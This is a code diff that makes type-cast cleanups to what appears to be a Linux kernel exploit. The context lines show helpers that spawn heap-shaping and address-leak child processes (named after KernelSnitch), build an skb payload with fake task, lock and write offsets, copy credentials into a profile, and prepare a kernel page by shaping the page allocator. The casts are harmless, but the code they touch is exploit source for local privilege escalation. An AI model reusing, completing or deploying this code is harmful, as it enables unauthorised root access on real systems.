@@ -104,7 +104,8 @@ void log_startup_context(void) {
   }
   struct timespec boot;
   SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
-  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
+  double boot_ms =
+      (double) boot.tv_sec * 1000.0 + (double) boot.tv_nsec / 1e6;
   pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
              "boot_ms=%.0f attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
@@ -212,13 +213,13 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
 /* Decoupling plan: create an mm-allocation helper child. Input: heap context;
  * output: owned PID. Future: heap_context_spawn_mm_child(). */
 pid_t clone_child(void) {
-  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
     if (getppid() == 1) {
       _exit(0);
     }
-    pin_to_core(runtime_config_snapshot().main_cpu);
+    pin_to_core((size_t) runtime_config_snapshot().main_cpu);
     for (;;) {
       pause();
     }
@@ -229,7 +230,7 @@ pid_t clone_child(void) {
 /* Decoupling plan: create and retain the leak helper child. Input/output: heap
  * context; output: owned PID. Future: heap_context_spawn_leak_child(). */
 pid_t clone_leak_child(void) {
-  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     kernelsnitch_context_find_collisions(ks);
     exit(0);
@@ -354,7 +355,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
   size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
 
-  uintptr_t payload_base = base + payload_delta;
+  uintptr_t payload_base = base + (uintptr_t) payload_delta;
 
   (g_heap_context.current.fake_lock) = payload_base + LOCK_OFF;
   (g_heap_context.current.fake_w0) = payload_base + W0_OFF;
@@ -502,8 +503,8 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ghostlock::KernelSnitchOwner snitch = ghostlock::KernelSnitchOwner::create(
       target_profile_mm_struct_sz(&g_target_profile, MM_STRUCT_SZ),
-      MM_ORDER, cpu_count, kernelsnitch_collisions(), 0,
-      runtime_config_snapshot().main_cpu);
+      MM_ORDER, (size_t) cpu_count, kernelsnitch_collisions(), 0,
+      (size_t) runtime_config_snapshot().main_cpu);
   /* The forked leak child borrows the shared mmap context through this
    * compatibility alias; the owner remains the only releaser. */
   auto clear_snitch_alias =
@@ -649,7 +650,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-  pin_to_core(runtime_config_snapshot().main_cpu);
+  pin_to_core((size_t) runtime_config_snapshot().main_cpu);
   sched_yield();
   sched_yield();
   sched_yield();
